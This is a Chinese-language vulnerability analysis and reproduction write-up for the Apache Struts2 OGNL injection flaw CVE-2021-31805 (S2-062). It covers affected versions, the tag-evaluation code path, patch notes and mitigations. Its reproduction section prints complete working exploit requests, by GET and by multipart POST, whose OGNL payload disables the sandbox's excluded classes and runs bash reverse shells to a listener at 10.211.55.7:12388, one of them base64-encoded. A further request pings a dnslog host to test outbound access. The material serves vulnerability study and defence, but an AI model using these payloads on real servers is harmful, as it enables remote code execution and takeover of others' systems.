## **0x01漏洞描述**

2022年04月12日，Apache官方发布了Apache
Struts2的风险通告，漏洞编号为CVE-2021-31805，漏洞等级：高危，漏洞评分：8.5。Apache Struts 2是一个用于开发Java
EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。在某些标签中若后端通过 %{...}
形式对其属性进行赋值，则将对 OGNL 表达式进行二次解析，从而执行恶意代码，该漏洞是 S2-061 的绕过，后端通过 %{...} 形式对特定标签
name 属性赋值；存在 Commons Collections 3.x 版本依赖。

![1651318229_626d1dd5f3533cd1f46b3.png!small](https://image.3001.net/images/20220430/1651318229_626d1dd5f3533cd1f46b3.png!small)

###  **0x02漏洞影响**

2.0.0 <= Apache Struts2 <= 2.5.29

###  **0x03漏洞分析**

参考国外分析软文。

![1651318243_626d1de35e4572c46c02e.png!small](https://image.3001.net/images/20220430/1651318243_626d1de35e4572c46c02e.png!small)

首先查看前端jsp文件name属性标签，是通过 %{...} 进行赋值后将对 OGNL 表达式进行二次解析，从而执行恶意代码。

![1651318254_626d1dee74c3b63b32b1f.png!small](https://image.3001.net/images/20220430/1651318254_626d1dee74c3b63b32b1f.png!small)

struts2运行Action类

![1651318266_626d1dfab1532560e6edf.png!small](https://image.3001.net/images/20220430/1651318266_626d1dfab1532560e6edf.png!small)

maven pom文件如下

    
    
    <?xml version="1.0" encoding="UTF-8"?><project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"><modelVersion>4.0.0</modelVersion>​<groupId>SimpleStruts</groupId><artifactId>SimpleStruts</artifactId><version>1.0-SNAPSHOT</version><packaging>war</packaging>​<name>SimpleStruts Maven Webapp</name><!-- FIXME change it to the project's website --><url>http://www.example.com</url>​<properties><project.build.sourceEncoding>UTF-8</project.build.sourceEncoding><maven.compiler.source>1.8</maven.compiler.source><maven.compiler.target>1.8</maven.compiler.target></properties>​<dependencies><dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.11</version><scope>test</scope></dependency><dependency><groupId>org.apache.struts</groupId><artifactId>struts2-core</artifactId><version>2.5.26</version></dependency><dependency><groupId>commons-collections</groupId><artifactId>commons-collections</artifactId><version>3.2.2</version></dependency></dependencies><build><finalName>SimpleStruts</finalName><pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --><plugins><plugin><artifactId>maven-clean-plugin</artifactId><version>3.1.0</version></plugin><!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --><plugin><artifactId>maven-resources-plugin</artifactId><version>3.0.2</version></plugin><plugin><artifactId>maven-compiler-plugin</artifactId><version>3.8.0</version></plugin><plugin><artifactId>maven-surefire-plugin</artifactId><version>2.22.1</version></plugin><plugin><artifactId>maven-war-plugin</artifactId><version>3.2.2</version></plugin><plugin><artifactId>maven-install-plugin</artifactId><version>2.5.2</version></plugin><plugin><artifactId>maven-deploy-plugin</artifactId><version>2.8.2</version></plugin></plugins></pluginManagement></build></project>

name传参

![1651318292_626d1e149a9175416db6f.png!small](https://image.3001.net/images/20220430/1651318292_626d1e149a9175416db6f.png!small)

在Strut2中对jsp中标签处理流程如下

    
    
    org.apache.struts2.views.jsp.ComponentTagSupport#doEndTag()

函数开始。调用

![1651318306_626d1e22b906f6eb53666.png!small](https://image.3001.net/images/20220430/1651318306_626d1e22b906f6eb53666.png!small)

    
    
    org.apache.struts2.components.UIBean#end()

函数，然后通过end()函数调用UIBean类的evaluateParams()函数。

![1651318318_626d1e2ec107236355973.png!small](https://image.3001.net/images/20220430/1651318318_626d1e2ec107236355973.png!small)

跟进evaluateParams函数对标签属性的处理，然后重点关注对name 属性的处理。

![1651318333_626d1e3dc54d1b1308e42.png!small](https://image.3001.net/images/20220430/1651318333_626d1e3dc54d1b1308e42.png!small)

![1651318353_626d1e5156354b16f43b4.png!small](https://image.3001.net/images/20220430/1651318353_626d1e5156354b16f43b4.png!small)

最终执行恶意代码。

![1651318367_626d1e5f3e92bdaa3cb7d.png!small](https://image.3001.net/images/20220430/1651318367_626d1e5f3e92bdaa3cb7d.png!small)  
补丁如下，@org.apache.commons.collections.BeanMap@{}没有任何沙箱限制，使用特殊的 OGNL
语法直接创建绕过沙箱限制。

![1651318384_626d1e70bb3fbb091bb94.png!small](https://image.3001.net/images/20220430/1651318384_626d1e70bb3fbb091bb94.png!small)

##  **0x04漏洞复现**

IDE平台下通过tomcat环境外部部署war包复现（也可以docker环境）

![1651318402_626d1e8216be0bd37cfea.png!small](https://image.3001.net/images/20220430/1651318402_626d1e8216be0bd37cfea.png!small)

通过GET方式将攻击payload进行发送，然后bash反弹shell（明文数据，传输过程中需一次url编码）

    
    
    GET /Struts2_62_war/S2061.action?payload=(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'bash -c {echo,bash -i >& /dev/tcp/10.211.55.7/12388 0>&1}|{base64,-d}|{bash,-i}'})) HTTP/1.1Host: 10.211.55.2:8080Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Encoding: deflateAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cache-Control: max-age=0Content-Length: 0Cookie: JSESSIONID=51B26DCD798CE551DD2D88CD470D6C5AUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0

![1651318416_626d1e90c4a2de0d34268.png!small](https://image.3001.net/images/20220430/1651318416_626d1e90c4a2de0d34268.png!small)

成功获取反向shell

![1651318431_626d1e9f64473a446b51e.png!small](https://image.3001.net/images/20220430/1651318431_626d1e9f64473a446b51e.png!small)

通过POST方式将攻击payload进行发送，然后bash反弹shell

    
    
    POST /s2_062/index.action HTTP/1.1Host:10.211.55.2:38105User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: closeCookie: JSESSIONID=node01c863u8lzu8eyn099a51bjyie0.node0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Length: 1191​------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name="name"​(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNy8xMjM4OCAwPiYx}|{base64,-d}|{bash,-I}'}))

![1651318452_626d1eb4b036fd972af92.png!small](https://image.3001.net/images/20220430/1651318452_626d1eb4b036fd972af92.png!small)

成功获取反向shell

![1651318463_626d1ebf9c345ecc17f77.png!small](https://image.3001.net/images/20220430/1651318463_626d1ebf9c345ecc17f77.png!small)

通过dnslog测试是否可以出网

    
    
    POST /s2_062/index.action HTTP/1.1Host:10.211.55.2:38105User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: closeCookie: JSESSIONID=node01c863u8lzu8eyn099a51bjyie0.node0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Length: 1191​------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name="name"​(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'ping ysvrdp.dnslog.cn'}))

![1651318473_626d1ec97f61efdb14a7a.png!small](https://image.3001.net/images/20220430/1651318473_626d1ec97f61efdb14a7a.png!small)

成功解析dnslog，可出网

![1651318485_626d1ed5adbfab1077bfb.png!small](https://image.3001.net/images/20220430/1651318485_626d1ed5adbfab1077bfb.png!small)

##  **0x05修复建议**

目前官方已有可更新版本，用户可升级至 2.5.30 版本：

https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.30

缓解方案

1、可通过设置所有标签中 value="" 来缓解此漏洞；

2、将 org.apache.commons.collections.BeanMap 添加至 excludedClasses 黑名单中。

漏洞自查

通过排查struts-core-版本号.jar来判断是否受此漏洞影响，

如果没有版本号可以在jar文件的META-INF/MANIFEST.MF中搜索Bundle-Version，如果struts-core <
2.5.30则存在该漏洞。

![1651318495_626d1edf591433a3b4487.png!small](https://image.3001.net/images/20220430/1651318495_626d1edf591433a3b4487.png!small)

##  **0x06参考链接**

https://nox.qianxin.com/vulnerability/detail/QVD-2021-14649

https://cwiki.apache.org/confluence/display/WW/S2-062

https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html

https://github.com/apache/struts/commit/0a75d8e8fa3e75d538fb0fcbc75473bdbff9209e

https://www.freebuf.com/vuls/257626.html

